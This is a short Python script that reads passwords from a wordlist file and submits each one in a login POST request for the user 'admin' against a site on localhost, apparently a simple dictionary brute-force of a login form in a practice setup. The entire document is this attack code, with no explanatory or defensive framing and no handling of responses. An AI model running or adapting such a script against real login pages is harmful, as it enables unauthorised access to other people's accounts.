import requests

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()
    for p in passwords:
        requests.post('http://localhost:1337/somesite/', data = {'login': 'login', 'name': 'admin', 'password': p.strip()})